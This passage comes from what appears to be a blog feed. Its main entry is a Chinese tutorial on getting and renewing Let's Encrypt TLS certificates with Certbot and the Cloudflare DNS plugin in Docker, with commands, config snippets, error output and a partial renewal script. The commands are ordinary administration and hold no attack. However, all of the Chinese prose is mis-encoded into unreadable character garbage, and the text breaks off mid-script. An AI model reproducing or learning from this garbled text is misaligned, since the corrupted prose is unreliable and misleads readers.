rel="noopener">phpæ‰§è¡Œshæ–‡ä»¶æ²¡æœ‰è¾“å‡ºçš„åŸå› åŠè§£å†³æ–¹æ³• - CSDN</a></li><li><a href="https://segmentfault.com/a/1190000012643992" target="_blank" rel="noopener">git webhooks å®ç°è‡ªåŠ¨æ‹‰å–ä»£ç </a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç©è½¬TLSç³»åˆ—ä¹‹äºŒã€‘ä½¿ç”¨ Certbot è·å– TLS è¯ä¹¦</title>
      <link href="/post/play-certbot-with-tls/"/>
      <url>/post/play-certbot-with-tls/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/007S8ZIlly1gf82zknh92j30g70a0dgl.jpg" alt=""></p><a id="more"></a><h1 id="1-ç®€ä»‹"><a href="#1-ç®€ä»‹" class="headerlink" title="1 ç®€ä»‹"></a>1 ç®€ä»‹</h1><p><a href="https://letsencrypt.org/" target="_blank" rel="noopener">Letâ€™s Encrypt</a>æ˜¯ä¸€ä¸ªæ—¨åœ¨æå‡äº’è”ç½‘å®‰å…¨ã€å…è´¹ã€è‡ªåŠ¨åŒ–çš„è¯ä¹¦é¢å‘æœºæ„ï¼ˆCA)ï¼Œç”±äº’è”ç½‘å®‰å…¨ç ”ç©¶å°ç»„ï¼ˆISRGï¼‰è¿è¥ã€‚å®ƒå¯ä»¥æä¾› 90 å¤©æœ‰æ•ˆæœŸçš„ TLS è¯ä¹¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ Certbot è‡ªåŠ¨éƒ¨ç½²å·¥å…·æ¥å®ç°è‡ªåŠ¨åŒ–ç»­æœŸè€Œè¾¾åˆ°å…è´¹é•¿æœŸä½¿ç”¨ï¼ŒSo, Letâ€™s Encrypt!</p><p><a href="https://certbot.eff.org/" target="_blank" rel="noopener">Certbot</a>æ˜¯ç”± EFF (ç”µå­å‰å“¨åŸºé‡‘ä¼š) è¿è¥çš„å®ç° ACME (è‡ªåŠ¨è¯ä¹¦ç®¡ç†ç¯å¢ƒ)åè®®çš„ TLS è‡ªåŠ¨éƒ¨ç½²å·¥å…·ï¼Œåœ¨<a href="https://certbot.eff.org/" target="_blank" rel="noopener">è¿™é‡Œ</a>å¯ä»¥æŸ¥çœ‹åœ¨ä¸åŒç³»ç»Ÿå’Œç¯å¢ƒä¸‹çš„å®‰è£…å‘½ä»¤ã€‚åœ¨ä½¿ç”¨Certbotå‰ï¼Œå»ºè®®ä»”ç»†é˜…è¯»<a href="https://certbot.eff.org/docs" target="_blank" rel="noopener">Certbotæ–‡æ¡£</a> å’Œ <a href="https://letsencrypt.org/zh-cn/docs/" target="_blank" rel="noopener">Letâ€™s Encrypt æ–‡æ¡£</a>ï¼Œå…¶ä¸­å¯¹å¾ˆå¤šæ¦‚å¿µéƒ½æœ‰è¯¦ç»†çš„è®²è§£ï¼Œä¹Ÿä¼šè§£å†³å¾ˆå¤šä½ é‡åˆ°çš„é—®é¢˜ã€‚ä»¥ä¸‹ç®€å•è®°å½•å¸¸ç”¨çš„ä½¿ç”¨æ‘˜è¦ã€‚</p><h1 id="2-ä½¿ç”¨æ‘˜è¦"><a href="#2-ä½¿ç”¨æ‘˜è¦" class="headerlink" title="2 ä½¿ç”¨æ‘˜è¦"></a>2 ä½¿ç”¨æ‘˜è¦</h1><h2 id="2-1-ç”³è¯·è¯ä¹¦"><a href="#2-1-ç”³è¯·è¯ä¹¦" class="headerlink" title="2.1 ç”³è¯·è¯ä¹¦"></a>2.1 ç”³è¯·è¯ä¹¦</h2><blockquote><p><a href="https://certbot.eff.org/docs/using.html#getting-certificates-and-choosing-plugins" target="_blank" rel="noopener">https://certbot.eff.org/docs/using.html#getting-certificates-and-choosing-plugins</a></p></blockquote><p>ç”³è¯·è¯ä¹¦æ—¶ï¼ŒLetâ€™s Encrypt éœ€è¦éªŒè¯ä½ å¯¹ç½‘ç«™çš„æ‰€æœ‰æƒï¼Œä¸»è¦æœ‰é€šè¿‡è®¿é—®æŒ‡å®šæ–‡ä»¶å’Œè®¿é—®æŒ‡å®š dns è®°å½•ç­‰æ–¹å¼ï¼Œå…·ä½“æœ‰ä»¥ä¸‹ 5 ç§ï¼š</p><ol><li>webrootï¼šåœ¨ç½‘ç«™æŒ‡å®šç›®å½•ä¸‹å­˜æ”¾æŒ‡å®šæ–‡ä»¶ï¼Œä»¥ä½¿ certbot éªŒè¯ç½‘ç«™çš„æ‰€æœ‰æƒ</li><li>standalone: ä»…ç”³è¯·è¯ä¹¦</li><li>nginx/apache: ç”³è¯·è¯ä¹¦å¹¶é…ç½®ç›¸åº”æœåŠ¡è½¯ä»¶</li><li>pluginï¼šæ ¹æ®ä¸åŒçš„ DNS æœåŠ¡æä¾›å•†é›†æˆçš„ä¸€é”®ç”³è¯·æ¨¡å‹</li><li>manualï¼šå¯æ‰‹åŠ¨æŒ‡å®šè®¤è¯æ–¹å¼ä¸º http æˆ– dnsï¼Œhttp å³é€šè¿‡éªŒè¯ç½‘ç«™æŒ‡å®šæ–‡ä»¶ï¼Œdns å³é€šè¿‡éªŒè¯ dns çš„ txt è®°å½•</li></ol><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒLetâ€™s Encryptæ¯å‘¨å¯¹é‡å¤è¯ä¹¦ç”³è¯·<a href="https://letsencrypt.org/zh-cn/docs/rate-limits/" target="_blank" rel="noopener">é™åˆ¶ä¸º 5 å¼ </a>ï¼Œåœ¨å­¦ä¹ è¯ä¹¦ç”³è¯·æ—¶ï¼Œå¯æ·»åŠ <code>--test-cert</code>å‚æ•°ç”³è¯·æµ‹è¯•è¯ä¹¦ï¼Œé™åˆ¶ä¸ºæ¯å‘¨ 3ä¸‡å¼ ã€‚</p><h2 id="2-2-ç®¡ç†è¯ä¹¦"><a href="#2-2-ç®¡ç†è¯ä¹¦" class="headerlink" title="2.2 ç®¡ç†è¯ä¹¦"></a>2.2 ç®¡ç†è¯ä¹¦</h2><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ—å‡ºæœ¬æœºçš„æ‰€æœ‰é€šè¿‡ certbot ç”³è¯·çš„è¯ä¹¦ï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>certbot certificates</span><br></pre></td></tr></table></figure><p><code>--cert-name</code>å¯ç”¨äº <code>run</code>, <code>certonly</code>, <code>certificates</code>, <code>renew</code>, <code>delete</code> ç­‰å­å‘½ä»¤ï¼ŒæŒ‡å®šæ“ä½œæŸä¸€åŸŸåï¼Œå¦‚<code>certbot certificates --cert-name example.com</code></p><h3 id="2-2-1-ç»­ç­¾è¯ä¹¦"><a href="#2-2-1-ç»­ç­¾è¯ä¹¦" class="headerlink" title="2.2.1 ç»­ç­¾è¯ä¹¦"></a>2.2.1 ç»­ç­¾è¯ä¹¦</h3><blockquote><p><a href="https://certbot.eff.org/docs/using.html#re-creating-and-updating-existing-certificates" target="_blank" rel="noopener">https://certbot.eff.org/docs/using.html#re-creating-and-updating-existing-certificates</a></p></blockquote><ol><li><code>certbot renew</code>å¯è‡ªåŠ¨æ›´æ–° 30 å¤©å†…åˆ°æœŸçš„è¯ä¹¦ï¼Œå¦åˆ™è·³è¿‡æœ¬æ¬¡ä»»åŠ¡ï¼ˆå¯ç”¨<code>--dry-run</code>æµ‹è¯•è¯ä¹¦æ˜¯å¦å¯æ­£å¸¸æ›´æ–°ï¼‰</li><li>ç»­æœŸå‰åå¯ä»¥ä½¿ç”¨é’©å­æ¥å®Œæˆä¸€äº›åŠ¨ä½œï¼Œå¦‚<code>certbot renew --pre-hook &quot;service nginx stop&quot; --post-hook &quot;service nginx start&quot;</code></li><li>å¯ä»¥ä½¿ç”¨<code>--deploy-hook</code>æ¥å®Œæˆç»­æœŸæˆåŠŸåçš„åŠ¨ä½œï¼Œå¦‚<code>certbot renew --deploy-hook /path/to/deploy-hook-script</code></li><li>é’©å­è„šæœ¬ä½äº <code>/etc/letsencrypt/renewal-hooks/{pre,post,deploy}</code> ç›®å½•ä¸‹ï¼Œå°†è„šæœ¬æ”¾ç½®åœ¨å¯¹åº”ä½ç½®ï¼Œå³å¯è‡ªåŠ¨æ‰§è¡Œ</li><li><code>-q</code>å¯å…³é—­ç»­æœŸæœŸé—´çš„æ—¥å¿—è¾“å‡º</li><li><code>-n</code> æˆ– <code>--noninteractive</code>å¯ç”¨äºé˜²æ­¢é˜»å¡ç”¨æˆ·è¾“å…¥ï¼Œåœ¨cron å‘½ä»¤è¿è¡Œæ—¶å¾ˆæœ‰ç”¨</li><li>è¯ä¹¦ç­¾å‘åï¼Œcertbot ä¼šè‡ªåŠ¨åœ¨ <code>/etc/letsencrypt/renewal/CERTNAME</code> ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ›´æ–°é…ç½®æ–‡ä»¶ï¼Œä¹‹åçš„æ›´æ–°ä¾¿ä¼šä¾æ®è¯¥æ–‡ä»¶è¿›è¡Œæ›´æ–°(ä¿®æ”¹<code>/etc/letsencrypt</code>ä¸­çš„ä»»ä½•æ–‡ä»¶éƒ½å¯èƒ½å¯¼è‡´ certbot æ— æ³•æ­£å¸¸å·¥ä½œï¼ï¼ï¼)</li></ol><h3 id="2-2-2-è¯ä¹¦å­˜æ”¾ä½ç½®"><a href="#2-2-2-è¯ä¹¦å­˜æ”¾ä½ç½®" class="headerlink" title="2.2.2 è¯ä¹¦å­˜æ”¾ä½ç½®"></a>2.2.2 è¯ä¹¦å­˜æ”¾ä½ç½®</h3><blockquote><p><a href="https://certbot.eff.org/docs/using.html#where-are-my-certificates" target="_blank" rel="noopener">https://certbot.eff.org/docs/using.html#where-are-my-certificates</a></p></blockquote><ol><li><code>/etc/letsencrypt/archive</code> å’Œ <code>/etc/letsencrypt/keys</code> åŒ…å«äº†æ‰€æœ‰ä»¥å‰çš„å¯†é’¥å’Œè¯ä¹¦ï¼Œè€Œ<code>/etc/letsencrypt/live</code>åˆ™æ˜¯æŒ‡å‘æœ€æ–°ç‰ˆçš„è½¯é“¾æ¥</li><li>å¦‚æœéœ€è¦å¤åˆ¶ç”³è¯·åçš„è¯ä¹¦ï¼Œå¯ä½¿ç”¨å‘½ä»¤<code>\cp -rfL /path/to/{fullchain.pem,privkey.pem} dir</code> å¤åˆ¶</li></ol><h2 id="2-3-æ—¥å¿—"><a href="#2-3-æ—¥å¿—" class="headerlink" title="2.3 æ—¥å¿—"></a>2.3 æ—¥å¿—</h2><blockquote><p><a href="https://certbot.eff.org/docs/using.html#id30" target="_blank" rel="noopener">https://certbot.eff.org/docs/using.html#id30</a></p></blockquote><ol><li>å­˜å‚¨äº<code>/var/log/letsencrypt</code>ï¼Œé»˜è®¤ 1k ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œè¶…è¿‡ 1k ä¸ªååˆ é™¤æœ€æ—§çš„</li></ol><h1 id="3-Docker-å®‰è£…"><a href="#3-Docker-å®‰è£…" class="headerlink" title="3 Docker å®‰è£…"></a>3 Docker å®‰è£…</h1><p>Docker æ–¹å¼æ”¯æŒå¤šä¸ª DNS æœåŠ¡å•†ï¼Œæˆ‘ä»¬æ­¤å¤„ä»¥ Cloudflare ä¸ºä¾‹ï¼Œæ¥å®ç° TLS è¯ä¹¦çš„ç”³è¯·ã€ç»­æœŸã€æ’¤é”€ç­‰æ“ä½œï¼Œç›¸å…³æ–‡æ¡£å¦‚ä¸‹ï¼š</p><ol><li><a href="https://certbot.eff.org/docs/install.html#running-with-docker" target="_blank" rel="noopener">running-with-docker - Certbot</a> </li><li><a href="https://certbot-dns-cloudflare.readthedocs.io/en/stable/" target="_blank" rel="noopener">certbot-dns-cloudflare</a></li><li><a href="https://soulteary.com/2018/08/30/use-docker-certbot-to-obtain-ssl-certificates.html" target="_blank" rel="noopener">ä½¿ç”¨ Docker CertBot è·å– SSL è¯ä¹¦</a></li></ol><h2 id="3-1-å®‰è£…-certbot"><a href="#3-1-å®‰è£…-certbot" class="headerlink" title="3.1 å®‰è£… certbot"></a>3.1 å®‰è£… certbot</h2><p>åœ¨<a href="https://certbot.eff.org/" target="_blank" rel="noopener">è¿™é‡Œ</a>æ ¹æ®è‡ªå·±çš„ä¸»æœºé…ç½®å®‰è£… certbotã€‚</p><h2 id="3-2-å®‰è£…-Docker"><a href="#3-2-å®‰è£…-Docker" class="headerlink" title="3.2 å®‰è£… Docker"></a>3.2 å®‰è£… Docker</h2><p>æŒ‰ç…§<a href="https://docs.docker.com/engine/install/" target="_blank" rel="noopener">æ–‡æ¡£</a>å®‰è£…å³å¯ï¼Œä¸è¿‡å¢™å†…ä¸»æœºä¼šç”±äºç½‘ç»œåŸå› ä¸‹è½½ç‰¹åˆ«æ…¢ã€‚</p><h2 id="3-3-ç”³è¯·è¯ä¹¦"><a href="#3-3-ç”³è¯·è¯ä¹¦" class="headerlink" title="3.3 ç”³è¯·è¯ä¹¦"></a>3.3 ç”³è¯·è¯ä¹¦</h2><p>ç”±äº Letâ€™s Encrypt åªæä¾›åŸŸåéªŒè¯å‹ï¼ˆDVï¼‰è¯ä¹¦ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦é€šè¿‡å®Œæˆ certbot å¯¹åŸŸåçš„æŒ‡å®šåŠ¨ä½œæ‰èƒ½è¯æ˜æˆ‘ä»¬å¯¹åŸŸåçš„æ‹¥æœ‰æƒã€‚åœ¨ docker æ–¹å¼ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ cloudflare.ini æ–‡ä»¶æ¥å¡«å†™ cloudflare çš„ä¿¡æ¯ï¼Œå…ˆåˆ›å»º cloudflare.ini æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir -p /home/xinyu/certbot</span><br><span class="line">$ touch cloudflare.ini</span><br></pre></td></tr></table></figure><p>åœ¨<a href="https://dash.cloudflare.com/profile/api-tokens" target="_blank" rel="noopener">è¿™é‡Œ</a>è®¾ç½®å¥½ key åï¼Œå°†ä»¥ä¸‹ä¿¡æ¯å†™å…¥ <code>cloudflare.ini</code> æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Cloudflare API credentials used by Certbot</span></span><br><span class="line">dns_cloudflare_email = cloudflare@example.com</span><br><span class="line">dns_cloudflare_api_key = 0123456789abcdef0123456789abcdef01234</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸€æ­¥æœ‰ä¸ªå‘ï¼Œå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨ Cloudflare çš„ Global API Key å¯ä»¥æ­£å¸¸ç”³è¯·è¯ä¹¦ï¼Œè€Œä½¿ç”¨ API Tokens åˆ™ä¼šæœ‰ä»¥ä¸‹é”™è¯¯æç¤ºï¼š</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error determining zone_<span class="symbol">id:</span> <span class="number">6003</span> Invalid request headers. Please confirm that you have supplied valid Cloudflare API credentials. (Did you copy your entire API token/key? To use Cloudflare tokens, you'll need the python package cloudflare&gt;</span><br><span class="line">=<span class="number">2.3</span>.<span class="number">1</span>. This certbot is running cloudflare <span class="number">2.3</span>.<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ä»”ç»†é˜…è¯»<a href="https://certbot-dns-cloudflare.readthedocs.io/en/stable/#credentials" target="_blank" rel="noopener">ç›¸å…³æ–‡æ¡£</a>ï¼Œå‘ç°å…¶ä¸­æœ‰è¿™æ ·ä¸€æ®µè¯</p><blockquote><p>Cloudflareâ€™s newer API Tokens can be restricted to specific domains and operations, and are therefore now the recommended authentication option.</p><p>However, due to some shortcomings in Cloudflareâ€™s implementation of Tokens, Tokens created for Certbot currently require Zone:Zone:Read and Zone:DNS:Edit permissions for all zones in your account. While this is not ideal, your Token will still have fewer permission than the Global key, so itâ€™s still worth doing. Hopefully Cloudflare will improve this in the future.</p></blockquote><p>éš¾é“æ˜¯å› ä¸ºæˆ‘çš„ API Tokens é…ç½®æœ‰é—®é¢˜ï¼Ÿå„ç§å°è¯•ä¸‹ä»ç„¶æ˜¯ç›¸åŒçš„é”™è¯¯æç¤ºï¼Œæœ€ååœ¨ certbot çš„æºç ä¸­ç»ˆäºçœ‹åˆ°äº†è¿™æ ·ä¸€æ®µä»£ç ï¼š<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf82016ptej31980quagg.jpg" alt=""></p><p>å¤§æ„æ˜¯è¿˜æœ‰ä¸€ç§è®¤è¯æ–¹å¼æ˜¯<code>dns_cloudflare_api_token</code>ï¼Œäºæ˜¯å°†<code>cloudflare.ini</code>å†…å®¹ä¿®æ”¹ä¸ºä»¥ä¸‹å†…å®¹ï¼Œç»“æœæœç„¶å¯ä»¥äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Cloudflare API credentials used by Certbot</span></span><br><span class="line">dns_cloudflare_api_token = 0123456789abcdef0123456789abcdef01234</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -it --rm --name certbot \</span><br><span class="line">    -v <span class="string">"/etc/letsencrypt:/etc/letsencrypt"</span> \</span><br><span class="line">    -v <span class="string">"/var/lib/letsencrypt:/var/lib/letsencrypt"</span> \</span><br><span class="line">    -v <span class="string">"/home/xinyu/certbot:/.secrets"</span> \</span><br><span class="line">    certbot/dns-cloudflare certonly \</span><br><span class="line">    --dns-cloudflare-credentials /.secrets/cloudflare.ini \</span><br><span class="line">    --dns-cloudflare-propagation-seconds 30 \</span><br><span class="line">    --<span class="built_in">test</span>-cert \</span><br><span class="line">    --server https://acme-v02.api.letsencrypt.org/directory \</span><br><span class="line">    -d shixinyu.space,*.shixinyu.space</span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š</p><ul><li><code>--dns-cloudflare-propagation-seconds</code>å¯ä»¥æ ¹æ®è‡ªå·±çš„ DNS è§£ææ—¶é—´è°ƒæ•´ï¼›</li><li>Letâ€™s Encrypt æ¯å‘¨å¯¹é‡å¤è¯ä¹¦ç”³è¯·é™åˆ¶ä¸º 5 å¼ ï¼Œ<code>--test-cert</code> å‚æ•°è°ƒç”¨æµ‹è¯•è¯ä¹¦ï¼Œé™åˆ¶ä¸ºæ¯å‘¨ 3 ä¸‡å¼ ï¼›</li><li>å¦‚æœä¸ç”³è¯·æ³›è§£æåŸŸåï¼Œå¯ä»¥å»æ‰<code>--server https://acme-v02.api.letsencrypt.org/directory</code>ã€‚</li></ul><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf8596nzraj30ib0jpq5q.jpg" alt=""></p><h2 id="3-4-æŸ¥çœ‹è¯ä¹¦"><a href="#3-4-æŸ¥çœ‹è¯ä¹¦" class="headerlink" title="3.4 æŸ¥çœ‹è¯ä¹¦"></a>3.4 æŸ¥çœ‹è¯ä¹¦</h2><p>é€šè¿‡å‘½ä»¤<code>certbot certificates</code>å¯ä»¥æŸ¥çœ‹æˆ‘ä»¬ä¸»æœºä¸Šæ‰€æœ‰é€šè¿‡ certbot ç”³è¯·çš„è¯ä¹¦<br><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf82h5x763j30ia08cwff.jpg" alt=""></p><h2 id="3-5-ç»­æœŸè¯ä¹¦"><a href="#3-5-ç»­æœŸè¯ä¹¦" class="headerlink" title="3.5 ç»­æœŸè¯ä¹¦"></a>3.5 ç»­æœŸè¯ä¹¦</h2><h3 id="3-5-1-æ‰‹åŠ¨ç»­æœŸ"><a href="#3-5-1-æ‰‹åŠ¨ç»­æœŸ" class="headerlink" title="3.5.1 æ‰‹åŠ¨ç»­æœŸ"></a>3.5.1 æ‰‹åŠ¨ç»­æœŸ</h3><p>è¦ç»­æœŸè¯ä¹¦ï¼Œå¯ä»¥å°†ç”³è¯·è¯ä¹¦çš„å‘½ä»¤å†æ‰§è¡Œä¸€æ¬¡ï¼Œåœ¨äº¤äº’ä¸­é€‰æ‹©ç»­æœŸé€‰é¡¹ï¼Œä½†ä¸ºäº†è‡ªåŠ¨åŒ–ç»­æœŸï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å®ç°ä¸€é”®ç»­æœŸï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -it --rm --name certbot \</span><br><span class="line">    -v <span class="string">"/etc/letsencrypt:/etc/letsencrypt"</span> \</span><br><span class="line">    -v <span class="string">"/var/lib/letsencrypt:/var/lib/letsencrypt"</span> \</span><br><span class="line">    -v <span class="string">"/home/xinyu/certbot:/.secrets"</span> \</span><br><span class="line">    certbot/dns-cloudflare renew \</span><br><span class="line">    --dns-cloudflare-credentials /.secrets/cloudflare.ini \</span><br><span class="line">    --dns-cloudflare-propagation-seconds 30 \</span><br><span class="line">    --server https://acme-v02.api.letsencrypt.org/directory \</span><br><span class="line">    --dry-run \</span><br><span class="line">    --cert-name shixinyu.space</span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š</p><ul><li><code>--dry-run</code> æ˜¯ç»­æœŸæµ‹è¯•å‘½ä»¤ï¼Œcertbot åªä¼šå¯¹30å¤©å†…è¿‡æœŸçš„è¯ä¹¦è¿›è¡Œç»­æœŸï¼Œè¯¥å‘½ä»¤å¯ä»¥æµ‹è¯•æœ‰æ•ˆæœŸå¤§äº30å¤©çš„è¯ä¹¦æ˜¯å¦å¯ä»¥æ­£å¸¸ç»­æœŸã€‚</li><li><code>--cert-name</code>ç”¨äºå¯¹æŒ‡å®šè¯ä¹¦ç»­æœŸï¼Œå¡«å†™<code>certbot certificates</code>ä¸­çš„<code>Certificate Name</code>å³å¯ï¼Œæ— æ­¤å‚æ•°é»˜è®¤å¯¹æ‰€æœ‰è¯ä¹¦è¿›è¡Œç»­æœŸ</li></ul><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf82ikv3waj30im0oj41m.jpg" alt=""></p><p>å¦‚æœåœ¨åˆ›å»ºæˆ–è€…ç»­æœŸè¯ä¹¦æœŸé—´é‡åˆ°ä»¥ä¸‹é”™è¯¯ï¼Œè¯·é€‚å½“è°ƒæ•´<code>--dns-cloudflare-propagation-seconds</code>å‚æ•°ï¼Œè¯¥é”™è¯¯çš„æ›´å¤šä¿¡æ¯å¯ä»¥æŸ¥çœ‹<a href="https://community.letsencrypt.org/t/during-secondary-validation-incorrect-txt-record/113643" target="_blank" rel="noopener">During secondary validation: Incorrect TXT record</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">IMPORTANT NOTES:</span><br><span class="line"> - The following errors were reported by the server:</span><br><span class="line"></span><br><span class="line">   Domain: shixinyu.space</span><br><span class="line">   Type:   unauthorized</span><br><span class="line">   Detail: During secondary validation: Incorrect TXT record</span><br><span class="line">   <span class="string">"lLY******4x5WA"</span> (<span class="keyword">and</span> 1 more) found at</span><br><span class="line">   _acme-challenge.shixinyu.space</span><br><span class="line"></span><br><span class="line">   Domain: shixinyu.space</span><br><span class="line">   Type:   unauthorized</span><br><span class="line">   Detail: Incorrect TXT record</span><br><span class="line">   <span class="string">"lLY******4x5WA"</span> (<span class="keyword">and</span> 1 more) found at</span><br><span class="line">   _acme-challenge.shixinyu.space</span><br><span class="line"></span><br><span class="line">   <span class="keyword">To</span> fix these errors, please make sure that your domain name was</span><br><span class="line">   entered correctly <span class="keyword">and</span> the<span class="built_in"> DNS </span>A/AAAA record(s) <span class="keyword">for</span> that domain</span><br><span class="line">   contain(s) the right<span class="built_in"> IP </span>address.</span><br></pre></td></tr></table></figure><h3 id="3-5-2-è‡ªåŠ¨ç»­æœŸ"><a href="#3-5-2-è‡ªåŠ¨ç»­æœŸ" class="headerlink" title="3.5.2 è‡ªåŠ¨ç»­æœŸ"></a>3.5.2 è‡ªåŠ¨ç»­æœŸ</h3><p>æ‰‹åŠ¨æ“ä½œå¤ªåŸå§‹äº†ï¼Œæˆ‘ä»¬é€šè¿‡å®šæ—¶è„šæœ¬çš„æ–¹å¼æ¥è‡ªåŠ¨å®Œæˆè¯¥é‡å¤æ“ä½œã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç”¨äºç»­æœŸçš„å®¹å™¨ï¼Œæˆ‘ä»¬æ¯æ¬¡éœ€è¦ç»­æœŸçš„æ—¶å€™ï¼Œåªéœ€è¦æ‰§è¡Œ<code>docker start certbot-renewal</code>å¯åŠ¨å®¹å™¨å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name certbot-renewal \</span><br><span class="line">    -v <span class="string">"/etc/letsencrypt:/etc/letsencrypt"</span> \</span><br><span class="line">    -v <span class="string">"/var/lib/letsencrypt:/var/lib/letsencrypt"</span> \</span><br><span class="line">    -v <span class="string">"/home/xinyu/certbot:/.secrets"</span> \</span><br><span class="line">    certbot/dns-cloudflare renew \</span><br><span class="line">    --dns-cloudflare-credentials /.secrets/cloudflare.ini \</span><br><span class="line">    --dns-cloudflare-propagation-seconds 20 \</span><br><span class="line">    --server https://acme-v02.api.letsencrypt.org/directory \</span><br><span class="line">    --cert-name shixinyu.space</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœè¦åœ¨å®¹å™¨ä¸­æ‰§è¡Œè„šæœ¬ï¼Œä¸€å®šè¦æŸ¥çœ‹å®¹å™¨ Linux ç‰ˆæœ¬ï¼ŒAlpine ç‰ˆæœ¬ç”±äºç²¾ç®€è€Œç»å¸¸ç”¨åšåˆ¶ä½œå®¹å™¨ï¼Œè¯¥ç‰ˆæœ¬ä¸­éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ol><li>shell æ˜¯ sh ï¼Œè€Œä¸æ˜¯ bash</li><li>æœ‰ wgetï¼Œè€Œæ²¡æœ‰ curl</li><li>ä¸è‡ªæŒç±»ä¼¼ <code>cp /path/to/{file1,file2} dir</code>çš„å¤šæ–‡ä»¶å¤åˆ¶å‘½ä»¤</li></ol></blockquote><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ª shell è„šæœ¬æ¥å¤„ç†ç»­æœŸçš„æ“ä½œå’Œé€šçŸ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šæ—¶ç»­ç­¾è¯ä¹¦</span></span><br><span class="line"><span class="comment"># Author: Xinyu Shi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯åŠ¨è¯ä¹¦ç»­æœŸå®¹å™¨</span></span><br><span class="line">docker start certbot-renewal 2&amp;&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å®¹å™¨é€€å‡ºç </span></span><br><span class="line">exitCode=$(docker inspect 117ea491188d --format=<span class="string">'&#123;&#123;.State.ExitCode&#125;&#125;'</span>)</span><br><span class="line"><span class="keyword">if</span> [ 0 -eq <span class="variable">$exitCode</span> ]; <span class="keyword">then</span></span><br><span class="line">    expireAt=$(cat /path/to/fullchain.pem | openssl x509 -noout -enddate)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># copy cert to trojan and nginx</span></span><br><span class="line">    \cp -rfL 